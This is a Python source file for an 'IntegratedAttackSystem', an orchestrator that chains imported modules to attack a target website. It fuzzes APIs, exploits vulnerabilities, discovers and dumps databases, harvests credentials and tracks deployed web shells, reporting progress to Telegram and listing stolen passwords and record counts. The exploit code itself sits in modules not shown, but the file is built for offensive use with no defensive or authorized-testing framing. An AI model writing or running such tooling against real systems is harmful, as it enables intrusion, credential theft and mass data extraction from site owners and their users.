from optimized_attack_engine import OptimizedAttackEngine
from database_viewer import DatabaseViewer
from telegram_progress_handler import telegram_progress
from api_fuzzing_engine import APIFuzzingEngine
from attack_chaining_engine import AttackChainingEngine
import asyncio
from typing import Dict, List, Any, Optional

class IntegratedAttackSystem:
    """Integrated high-performance attack system with database access and Telegram progress"""
    
    def __init__(self, target_url: str, vulnerabilities: List[Dict[str, Any]]):
        self.target_url = target_url
        self.vulnerabilities = vulnerabilities
        self.attack_engine = OptimizedAttackEngine(target_url, vulnerabilities)
        self.db_viewer = DatabaseViewer()
        self.api_fuzzer = APIFuzzingEngine(target_url)
        self.chain_engine = AttackChainingEngine(target_url, vulnerabilities)
        self.telegram_message_id = None
        
    def set_telegram_progress(self, message_id: int):
        """Set Telegram message ID for progress updates"""
        self.telegram_message_id = message_id
        
        # Set progress callbacks
        self.attack_engine.set_progress_callback(self._attack_progress_callback)
        self.db_viewer.set_progress_callback(self._db_progress_callback)
    
    async def _attack_progress_callback(self, message: str):
        """Handle attack progress updates"""
        if self.telegram_message_id:
            # Parse progress from message
            progress = self._extract_progress_from_message(message)
            await telegram_progress.update_progress(
                self.telegram_message_id, 
                progress, 
                message, 
                0, 0, [message]
            )
    
    async def _db_progress_callback(self, message: str):
        """Handle database progress updates"""
        if self.telegram_message_id:
            progress = self._extract_progress_from_message(message)
            await telegram_progress.update_progress(
                self.telegram_message_id, 
                progress, 
                message, 
                0, 0, [message]
            )
    
    def _extract_progress_from_message(self, message: str) -> int:
        """Extract progress percentage from message"""
        if "Progress:" in message:
            try:
                return int(message.split("Progress:")[1].split("%")[0].strip())
            except:
                pass
        
        # Estimate progress based on message content
        if "Starting" in message:
            return 5
        elif "completed" in message.lower():
            return 100
        elif "failed" in message.lower():
            return 95
        else:
            return 50  # Default middle progress
    
    def _correlate_vulnerabilities_with_ml(self) -> Dict[str, Any]:
        """Use ML patterns to correlate vulnerabilities for advanced chaining"""
        correlation_matrix = {}
        
        # Advanced vulnerability correlation patterns
        vuln_patterns = {
            'SQL_to_RCE': {
                'trigger': ['SQL Injection'],
                'leads_to': ['Remote Code Execution', 'File Upload'],
                'confidence': 0.85,
                'technique': 'INTO OUTFILE exploitation'
            },
            'XSS_to_Session_Takeover': {
                'trigger': ['Cross-Site Scripting'],
                'leads_to': ['Session Hijacking', 'CSRF'],
                'confidence': 0.92,
                'technique': 'Cookie stealing + Session replay'
            },
            'IDOR_to_Mass_Data_Breach': {
                'trigger': ['IDOR'],
                'leads_to': ['Data Enumeration', 'Information Disclosure'],
                'confidence': 0.78,
                'technique': 'Automated ID enumeration'
            },
            'File_Upload_to_System_Compromise': {
                'trigger': ['File Upload'],
                'leads_to': ['Remote Code Execution', 'Local File Inclusion'],
                'confidence': 0.89,
                'technique': 'Web shell deployment'
            }
        }
        
        discovered_vuln_types = [v.get('type', '') for v in self.vulnerabilities]
        
        for pattern_name, pattern_data in vuln_patterns.items():
            trigger_found = any(trigger in discovered_vuln_types for trigger in pattern_data['trigger'])
            if trigger_found:
                correlation_matrix[pattern_name] = {
                    'applicable': True,
                    'confidence': pattern_data['confidence'],
                    'technique': pattern_data['technique'],
                    'potential_impact': pattern_data['leads_to']
                }
        
        return correlation_matrix
    
    async def execute_full_attack_sequence(self) -> Dict[str, Any]:
        """Execute comprehensive attack sequence with advanced engines"""
        
        # Phase 1: API Discovery and Fuzzing
        if self.telegram_message_id:
            await telegram_progress.update_progress(
                self.telegram_message_id, 5, 
                "🔍 Discovering API endpoints...", 
                0, 0, ["Starting API discovery"]
            )
        
        # Discover and fuzz API endpoints
        discovered_endpoints = self.api_fuzzer.discover_api_endpoints()
        api_fuzz_results = self.api_fuzzer.fuzz_discovered_endpoints(aggressive=True)
        
        # Phase 2: Attack Chain Analysis
        if self.telegram_message_id:
            await telegram_progress.update_progress(
                self.telegram_message_id, 15, 
                "⛓️ Analyzing attack chains...", 
                0, 0, ["Analyzing vulnerability chains"]
            )
        
        chain_analysis = self.chain_engine.analyze_vulnerability_chains()
        
        # Phase 3: Initial vulnerability exploitation
        if self.telegram_message_id:
            await telegram_progress.update_progress(
                self.telegram_message_id, 25, 
                "🚀 Starting vulnerability exploitation...", 
                0, 0, ["Initializing attack engine"]
            )
        
        attack_results = self.attack_engine.start_optimized_attacks()
        
        # Phase 4: Execute Attack Chains
        if self.telegram_message_id:
            await telegram_progress.update_progress(
                self.telegram_message_id, 45, 
                "⛓️ Executing attack chains...", 
                attack_results.get('successful_exploits', 0),
                attack_results.get('failed_exploits', 0),
                ["Chaining vulnerabilities for maximum impact"]
            )
        
        chain_results = self.chain_engine.execute_all_available_chains()
        
        # Phase 5: Database discovery and exploitation
        if self.telegram_message_id:
            await telegram_progress.update_progress(
                self.telegram_message_id, 70, 
                "🔍 Discovering database services...", 
                attack_results.get('successful_exploits', 0) + api_fuzz_results.get('vulnerabilities_found', 0),
                attack_results.get('failed_exploits', 0),
                ["Scanning for database services"]
            )
        
        # Extract target host from URL
        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        target_host = parsed.hostname or parsed.netloc.split(':')[0]
        
        # Discover databases
        db_results = self.db_viewer.discover_databases(target_host)
        
        # Phase 3: Database exploitation
        if db_results.get('successful_connections'):
            if self.telegram_message_id:
                await telegram_progress.update_progress(
                    self.telegram_message_id, 80, 
                    f"💾 Exploiting {len(db_results['successful_connections'])} databases...", 
                    attack_results.get('successful_exploits', 0),
                    attack_results.get('failed_exploits', 0),
                    [f"Found {len(db_results['successful_connections'])} database connections"]
                )
            
            # Dump databases
            for conn in db_results['successful_connections']:
                conn_key = f"{conn['host']}:{conn['port']}"
                dump_result = self.db_viewer.dump_database(conn_key)
                
                if dump_result.get('success'):
                    attack_results['databases_compromised'].append({
                        'type': conn['service'],
                        'host': conn['host'],
                        'port': conn['port'],
                        'credentials': f"{conn['username']}:{conn['password']}",
                        'dump_file': dump_result['dump_file'],
                        'tables_dumped': len(dump_result['tables_dumped']),
                        'total_records': dump_result['total_records']
                    })
        
        # Merge all results
        attack_results['database_discovery'] = db_results
        attack_results['api_fuzzing'] = api_fuzz_results
        attack_results['attack_chains'] = chain_results
        attack_results['discovered_endpoints'] = discovered_endpoints
        
        # Update counters
        attack_results['total_attacks'] += len(db_results.get('connection_attempts', []))
        attack_results['total_attacks'] += len(discovered_endpoints)
        attack_results['total_attacks'] += chain_results.get('total_chains', 0)
        
        attack_results['successful_exploits'] += len(db_results.get('successful_connections', []))
        attack_results['successful_exploits'] += api_fuzz_results.get('vulnerabilities_found', 0)
        attack_results['successful_exploits'] += chain_results.get('successful_chains', 0)
        
        # Add database credentials to main results
        for conn in db_results.get('successful_connections', []):
            attack_results['credentials_found'].append({
                'type': f"{conn['service']} Database",
                'username': conn['username'],
                'password': conn['password'],
                'host': conn['host'],
                'port': conn['port']
            })
        
        # Add API fuzzing credentials
        for endpoint_result in api_fuzz_results.get('detailed_results', []):
            for vuln in endpoint_result.get('vulnerabilities', []):
                if 'authentication' in vuln.get('type', '').lower():
                    attack_results['credentials_found'].append({
                        'type': 'API Authentication Bypass',
                        'endpoint': vuln.get('endpoint', ''),
                        'method': vuln.get('method', ''),
                        'evidence': vuln.get('evidence', '')
                    })
        
        # Add attack chain credentials
        if hasattr(self.chain_engine, 'extracted_credentials'):
            for cred in self.chain_engine.extracted_credentials:
                attack_results['credentials_found'].append({
                    'type': 'Chain Extracted Credential',
                    'username': cred.get('username', ''),
                    'password': cred.get('password', ''),
                    'source': cred.get('source', '')
                })
        
        # Phase 4: Final completion
        if self.telegram_message_id:
            await telegram_progress.complete_progress(self.telegram_message_id, attack_results)
        
        return attack_results
    
    def generate_comprehensive_report(self, results: Dict[str, Any]) -> str:
        """Generate comprehensive attack report"""
        
        report = f"""
═══════════════════════════════════════
    COMPREHENSIVE ATTACK REPORT
═══════════════════════════════════════

🎯 TARGET: {self.target_url}
⏱️ TIMESTAMP: {results.get('timestamp', 'N/A')}

📊 ATTACK SUMMARY:
├─ Total Attacks: {results.get('total_attacks', 0)}
├─ Successful Exploits: {results.get('successful_exploits', 0)}
├─ Failed Attempts: {results.get('failed_exploits', 0)}
└─ Success Rate: {(results.get('successful_exploits', 0) / max(results.get('total_attacks', 1), 1) * 100):.1f}%

🔍 API DISCOVERY:
├─ Endpoints Found: {len(results.get('discovered_endpoints', []))}
├─ API Vulnerabilities: {results.get('api_fuzzing', {}).get('vulnerabilities_found', 0)}
├─ Auth Bypasses: {results.get('api_fuzzing', {}).get('authentication_bypasses', 0)}
└─ Injection Flaws: {results.get('api_fuzzing', {}).get('injection_vulnerabilities', 0)}

⛓️ ATTACK CHAINS:
├─ Available Chains: {results.get('attack_chains', {}).get('total_chains', 0)}
├─ Successful Chains: {results.get('attack_chains', {}).get('successful_chains', 0)}
├─ Objectives Achieved: {len(results.get('attack_chains', {}).get('objectives_achieved', []))}
└─ Chain Success Rate: {(results.get('attack_chains', {}).get('successful_chains', 0) / max(results.get('attack_chains', {}).get('total_chains', 1), 1) * 100):.1f}%

🏆 COMPROMISED ASSETS:
├─ Credentials Found: {len(results.get('credentials_found', []))}
├─ Web Shells Deployed: {len(results.get('shells_obtained', []))}
├─ Databases Accessed: {len(results.get('databases_compromised', []))}
└─ Data Records Extracted: {sum(db.get('total_records', 0) for db in results.get('databases_compromised', []))}

"""
        
        # Add credential details
        if results.get('credentials_found'):
            report += "\n🔑 CREDENTIALS DISCOVERED:\n"
            for i, cred in enumerate(results['credentials_found'][:10], 1):
                report += f"{i:2d}. {cred.get('type', 'Unknown'):20} | {cred.get('username', 'N/A'):15} : {cred.get('password', 'N/A')[:20]}\n"
        
        # Add database compromises
        if results.get('databases_compromised'):
            report += "\n💾 DATABASE COMPROMISES:\n"
            for i, db in enumerate(results['databases_compromised'], 1):
                report += f"{i:2d}. {db.get('type', 'Unknown'):12} | {db.get('host', 'N/A'):15}:{db.get('port', 'N/A')} | {db.get('tables_dumped', 0)} tables | {db.get('total_records', 0)} records\n"
        
        # Add web shells
        if results.get('shells_obtained'):
            report += "\n🐚 WEB SHELLS DEPLOYED:\n"
            for i, shell in enumerate(results['shells_obtained'], 1):
                report += f"{i:2d}. {shell.get('type', 'Unknown'):15} | {shell.get('filename', 'N/A'):20} | {shell.get('access_method', 'N/A')}\n"
        
        report += "\n═══════════════════════════════════════\n"
        return report

# Global integrated system instance
integrated_system = None